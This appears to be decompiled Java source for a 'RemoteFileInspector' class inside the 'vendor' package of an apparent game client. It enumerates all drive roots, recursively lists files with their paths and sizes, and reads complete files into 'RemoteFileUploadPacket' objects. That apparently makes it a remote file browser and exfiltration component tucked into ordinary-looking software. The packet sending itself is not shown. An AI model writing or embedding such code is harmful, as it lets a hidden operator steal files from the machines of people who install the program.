package net.augustus.vendor;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Stack;
import net.augustus.vendor.packet.RemoteFileUploadPacket;

public class RemoteFileInspector {

   public static ArrayList listFilesRecursiveMetadata(String str) {

      try {
         ArrayList list = new ArrayList();
         File file = new File(str);
         if (!file.isDirectory()) {
            ArrayList list2 = new ArrayList();
            list2.add(new RemoteFileMetadata("File is not a directory", "", 0L, false));
            return list2;
         } else {
            for (File file2 : (Iterable<File>)(collectFilesRecursive(file))) {
               list.add(new RemoteFileMetadata(file2.getAbsolutePath(), file2.getName(), file2.length(), file2.isDirectory()));
            }

            return list;
         }
      } catch (Throwable e) {
         ArrayList list3 = new ArrayList();
         list3.add(new RemoteFileMetadata(e.getMessage(), e.getLocalizedMessage(), 0L, false));
         return list3;
      }
   }

   public static ArrayList collectFilesRecursive(File file) {
      Object obj = null;
      Object obj2 = null;
      Object obj3 = null;
      Object obj4 = null;
      Object obj5 = null;
      boolean flag = false;
      int n = 0;
      Object obj6 = null;
      obj5 = new ArrayList();
      obj = new Stack();
      ((Stack)obj).push(file);

      while (!((Stack)obj).isEmpty()) {
         obj6 = (File)((Stack)obj).pop();
         if (!((File)obj6).isDirectory()) {
            ((ArrayList)obj5).add((File)obj6);
         } else {
            obj3 = ((File)obj6).listFiles();
            if ((File[])obj3 != null) {
               obj4 = (File[])obj3;
               n = ((File[])obj4).length;

               for (int i = 0; i < n; i++) {
                  obj2 = ((File[])obj4)[i];
                  ((Stack)obj).push((File)obj2);
               }
            }
         }
      }

      return (ArrayList)obj5;
   }

   public static ArrayList collectFilesFromPath(String str) {

      try {
         return collectFilesRecursive(new File(str));
      } catch (Throwable e) {
         return new ArrayList();
      }
   }

   public static ArrayList listDirectoryMetadata(String str) {
      if (str.isEmpty()) {
         ArrayList list = new ArrayList();

         for (File file : File.listRoots()) {
            list.add(new RemoteFileMetadata(file.getAbsolutePath(), "", 0L, true));
         }

         return list;
      } else {
         try {
            ArrayList list2 = new ArrayList();
            File file2 = new File(str);
            if (!file2.isDirectory()) {
               ArrayList list3 = new ArrayList();
               list3.add(new RemoteFileMetadata("File is not a directory", "", 0L, false));
               return list3;
            } else {

               for (File file3 : file2.listFiles()) {
                  list2.add(new RemoteFileMetadata(file3.getAbsolutePath(), file3.getName(), file3.length(), file3.isDirectory()));
               }

               return list2;
            }
         } catch (Throwable e) {
            ArrayList list4 = new ArrayList();
            list4.add(new RemoteFileMetadata(e.getMessage(), e.getLocalizedMessage(), 0L, false));
            return list4;
         }
      }
   }

   public static RemoteFileUploadPacket createFileUploadPacket(File file, long l, int n, int n2, byte[] bytes) {

      try {
         long length = file.length();
         if (length > l) {
            return new RemoteFileUploadPacket("File too large (" + length + " bytes)", file.getAbsolutePath(), n, n2, bytes);
         } else {
            FileInputStream fileInputStream = new FileInputStream(file);
            byte[] bytes2 = readAllBytes(fileInputStream, (short)4096);
            fileInputStream.close();
            return new RemoteFileUploadPacket(file.getAbsolutePath(), file.getName(), bytes2, n, n2, bytes);
         }
      } catch (Throwable e) {
         return new RemoteFileUploadPacket(e.getMessage(), "", n, n2, bytes);
      }
   }

   public static byte[] readAllBytes(InputStream in, int n) throws IOException {
      Object obj = null;
      int n2 = 0;
      short s = 0;
      int n3 = 0;
      int n4 = 0;
      int n5 = 0;
      n2 = n;
      obj = new byte[n];
      n4 = 0;
      n5 = 2147483639;
      s = 8192;

      while (true) {
         while ((n3 = in.read((byte[])obj, n4, n2 - n4)) > 0) {
            n4 += n3;
         }

         if (n3 < 0) {
            break;
         }

         if ((n3 = in.read()) < 0) {
            break;
         }

         if (n2 > n5 - n2) {
            if (n2 == n5) {
               throw new OutOfMemoryError("Required array size too large");
            }

            n2 = n5;
         } else {
            n2 = Math.max(n2 << 1, s);
         }

         obj = Arrays.copyOf((byte[])obj, n2);
         ((byte[])obj)[n4++] = (byte)n3;
      }

      return n2 != n4 ? Arrays.copyOf((byte[])obj, n4) : (byte[])obj;
   }




}
